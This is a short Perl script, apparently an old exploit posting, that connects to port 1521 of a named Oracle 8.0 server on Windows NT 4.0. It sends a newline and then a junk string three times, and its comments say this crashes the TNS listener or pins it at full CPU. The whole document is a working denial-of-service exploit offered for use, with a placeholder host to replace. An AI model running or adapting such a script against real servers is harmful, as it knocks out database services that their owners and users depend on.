#!/usr/local/bin/perl -w

# This little script crashes Oracle 8.0 on Windows NT 4.0 (Sp6)
# TNSLSNR80.EXE will consume 100% CPU...
#
# by r0ot@runbox.com

use IO::Socket;

$host="kickme";
# enter the hostname of the oracle-server to kick

socket(HANDLE, PF_INET, SOCK_STREAM, 6);
connect(HANDLE, sockaddr_in(1521, scalar gethostbyname($host)));
HANDLE->autoflush(1);

sleep(2);
print HANDLE "\n";
for ($i=0; $i<3; $i++) {
        sleep(2);
        print HANDLE "dfsdffdfsfdggfdgdf";
        # an arbitrary, but carefully chosen constant...
}

close(HANDLE);